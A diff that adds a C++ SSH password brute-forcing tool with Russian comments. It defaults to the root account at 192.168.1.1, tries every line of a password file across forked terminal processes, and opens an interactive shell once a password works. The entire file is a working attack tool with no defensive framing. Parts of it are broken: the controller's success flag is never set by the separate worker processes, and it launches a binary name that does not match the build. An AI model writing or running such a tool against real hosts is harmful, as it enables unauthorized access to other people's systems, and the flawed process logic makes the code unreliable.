@@ -1,0 +1,182 @@
+// Сборка g++ -std=c++17 -pthread -lssh main.cpp -o ssh_bruteforce
+
+#include <libssh/libssh.h>
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <thread>
+#include <mutex>
+#include <atomic>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <signal.h>
+
+std::atomic<bool> found(false);
+std::mutex output_mutex;
+std::vector<pid_t> terminal_pids;
+
+// Функция авторизации SSH
+void attemptSSHLogin(const std::string& hostname, const std::string& username, const std::vector<std::string>& passwords, int start_index, int step) {
+    ssh_session session = ssh_new();
+    if (session == nullptr) {
+        return;
+    }
+
+    ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
+    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
+
+    if (ssh_connect(session) != SSH_OK) {
+        std::lock_guard<std::mutex> lock(output_mutex);
+        std::cerr << "[Ошибка] Подключение к " << hostname << " не удалось: "
+                  << ssh_get_error(session) << std::endl;
+        ssh_free(session);
+        return;
+    }
+
+    for (size_t i = start_index; i < passwords.size(); i += step) {
+        if (found.load()) {
+            break;
+        }
+
+        const std::string& password = passwords[i];
+        int auth = ssh_userauth_password(session, nullptr, password.c_str());
+
+        if (auth == SSH_AUTH_SUCCESS) {
+            {
+                std::lock_guard<std::mutex> lock(output_mutex);
+                std::cout << "[ПОБЕДА] Пароль найден: " << password << std::endl;
+            }
+
+            found.store(true);
+
+            // Активируем сессию
+            ssh_channel channel = ssh_channel_new(session);
+            if (channel == nullptr) {
+                ssh_disconnect(session);
+                ssh_free(session);
+                return;
+            }
+
+            if (ssh_channel_open_session(channel) != SSH_OK) {
+                ssh_channel_free(channel);
+                ssh_disconnect(session);
+                ssh_free(session);
+                return;
+            }
+
+            ssh_channel_request_shell(channel);
+
+            char buffer[256];
+            int nbytes;
+            while ((nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0)) > 0) {
+                write(1, buffer, nbytes);
+            }
+
+            ssh_channel_send_eof(channel);
+            ssh_channel_close(channel);
+            ssh_channel_free(channel);
+
+            ssh_disconnect(session);
+            ssh_free(session);
+            exit(0);  // Завершаем процесс успешного терминала
+        } else {
+            std::lock_guard<std::mutex> lock(output_mutex);
+            std::cerr << "[Ошибка] Неверный пароль: " << password << std::endl;
+        }
+    }
+
+    ssh_disconnect(session);
+    ssh_free(session);
+}
+
+// Запускаем терминал с новым процессом
+void launchTerminal(const std::string& hostname, const std::string& username, const std::vector<std::string>& passwords, int start_index, int step) {
+    pid_t pid = fork();
+    if (pid == 0) {
+        // В дочернем процессе: запускаем терминал и передаем параметры
+        std::string command = "./ssh_worker " + hostname + " " + username + " " +
+                              std::to_string(start_index) + " " + std::to_string(step);
+        
+        execlp("gnome-terminal", "gnome-terminal", "--", "bash", "-c", command.c_str(), nullptr);
+        execlp("xterm", "xterm", "-hold", "-e", command.c_str(), nullptr);
+        
+        // Если execlp не сработал
+        perror("Не удалось запустить терминал");
+        exit(1);
+    } else if (pid > 0) {
+        terminal_pids.push_back(pid);
+    } else {
+        std::cerr << "Ошибка fork()" << std::endl;
+    }
+}
+
+// Завершить все процессы терминалов
+void killAllTerminals() {
+    for (pid_t pid : terminal_pids) {
+        kill(pid, SIGKILL);
+    }
+}
+
+int main(int argc, char* argv[]) {
+    // Проверяем, не запущен ли это как "рабочий процесс"
+    if (argc == 5) {
+        std::string hostname = argv[1];
+        std::string username = argv[2];
+        int start_index = std::stoi(argv[3]);
+        int step = std::stoi(argv[4]);
+
+        // Читаем пароли
+        std::vector<std::string> passwords;
+        std::ifstream file("passwords.txt");
+        if (!file) {
+            std::cerr << "[Ошибка] Не удалось открыть файл passwords.txt" << std::endl;
+            return 1;
+        }
+
+        std::string line;
+        while (std::getline(file, line)) {
+            passwords.push_back(line);
+        }
+        file.close();
+
+        attemptSSHLogin(hostname, username, passwords, start_index, step);
+        return 0;
+    }
+
+    // Запуск основного контроллера
+    std::string hostname = "192.168.1.1";
+    std::string username = "root";
+
+    // Читаем пароли один раз
+    std::vector<std::string> passwords;
+    std::ifstream file("passwords.txt");
+    if (!file) {
+        std::cerr << "[Ошибка] Не удалось открыть файл passwords.txt" << std::endl;
+        return 1;
+    }
+
+    std::string line;
+    while (std::getline(file, line)) {
+        passwords.push_back(line);
+    }
+    file.close();
+
+    unsigned int cpu_cores = std::thread::hardware_concurrency();
+    if (cpu_cores == 0) cpu_cores = 2;  // По умолчанию хотя бы 2
+
+    std::cout << "Используем ядер: " << cpu_cores << std::endl;
+
+    for (unsigned int i = 0; i < cpu_cores; ++i) {
+        launchTerminal(hostname, username, passwords, i, cpu_cores);
+    }
+
+    // Мониторинг: ждём, пока кто-то победит
+    while (!found.load()) {
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+    }
+
+    std::cout << "Пароль найден! Завершаем терминалы..." << std::endl;
+    killAllTerminals();
+
+    return 0;
+}
